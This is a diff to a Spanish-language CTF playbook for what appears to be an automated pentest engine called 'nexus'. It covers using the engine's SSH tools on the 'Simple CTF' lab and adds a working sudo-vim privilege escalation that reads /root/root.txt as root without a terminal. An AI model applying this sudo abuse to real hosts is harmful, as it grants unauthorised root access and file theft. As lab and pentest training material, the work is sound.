@@ -12,6 +12,28 @@ la contraseña SSH era incorrecta. Repitió la misma llamada y murió por timeou
 con 20 minutos de presupuesto. La contraseña era correcta: `-n` es lo que
 fallaba.
 
+## 0. Ejecuta esto con las *tools*, no con `shell.exec` + `sshpass`
+
+El motor solo aprende lo que prueban sus tools: `nexus.post.ssh_exec` y
+`nexus.post.enum_system` derivan los hechos **verificados** (`access`,
+`privilege`, `loot`, `cred:ssh:<usuario>@<host>`) que cierran las fases, eximen
+el presupuesto y sostienen los hallazgos del reporte. Una sesión
+`sshpass … ssh …` lanzada con `nexus.shell.exec` devuelve la misma salida pero
+**no deja rastro en el tablero**. Medido en Simple CTF
+(`simplectf-20261018T002954Z-run1`): las dos flags se capturaron y el run igual
+murió en `budget_exceeded` con `objective_complete=false`, porque la escalada y
+la lectura de `root.txt` viajaron por `shell.exec`.
+
+Orden preferido:
+
+1. `nexus.post.ssh_exec(target, username, command)` -el motor rellena el puerto
+y la credencial que el engagement ya probó, no hace falta repetirlos-.
+2. `nexus.post.enum_system(target, username)` para el barrido de sudo/SUID/
+capabilities (devuelve `sudo_rules` ya parseadas).
+3. `nexus.shell.exec` **solo** si el canal SSH rechaza la sesión: el handler de
+`ssh_exec` ya reejecuta con `sshpass -d 0` cuando el tablero prueba la credencial
+(ver «Rate-limit» abajo).
+
 ## 1. `-n` no significa «sin contraseña», significa «no preguntes»
 
 ```bash
@@ -143,6 +165,24 @@ Dentro del shell de root:
 id                 # uid=0(root) gid=0(root)
 cat /root/root.txt
 ```
+
+### El escape que funciona **sin PTY** (medido)
+
+`sudo vim -c ':!/bin/sh'` necesita un terminal. Por `nexus.post.ssh_exec` el
+canal es `exec_command(get_pty=False)` (V1-46): ese shell arranca, lee EOF en la
+desconexión y se pierde. El mismo escape en modo no interactivo **sí** funciona;
+verificado contra Simple CTF (`10.64.128.102`, sshd en 2222) el 2026-10-17:
+
+```
+nexus.post.ssh_exec(target=<ip>, username="mitch",
+                    command="sudo vim -c ':r /root/root.txt' -c ':w! /tmp/r.txt' -c ':q!' >/dev/null 2>&1; cat /tmp/r.txt")
+# -> W3ll d0n3. You made it!
+```
+
+`:r <fichero>` lee como root y `:w! <ruta>` escribe como root, así que el
+resultado se lee después con un `cat` normal (y el motor lo registra como `loot`
+verificado: el canal está autenticado y el comando salió 0). Para probar el
+escape antes de leer la flag: `-c ':!id > /tmp/i' -c ':q!' >/dev/null 2>&1; cat /tmp/i`.
 
 Variantes útiles cuando `vim` está restringido a un fichero concreto:
 
